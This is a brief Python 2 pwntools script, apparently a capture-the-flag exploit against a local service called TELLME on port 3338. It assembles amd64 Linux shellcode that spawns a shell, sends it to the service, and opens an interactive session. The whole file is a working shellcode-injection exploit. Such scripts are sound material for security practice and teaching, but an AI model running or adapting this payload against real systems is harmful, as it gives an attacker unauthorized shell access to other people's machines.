#!/usr/bin/python2

from pwn import *

context.binary = "./TELLME"

s = remote("localhost", 3338)
#s = process("./a.out")

payload = asm(shellcraft.amd64.linux.sh())

print s.recvline()
print payload
s.send(payload)
s.interactive()
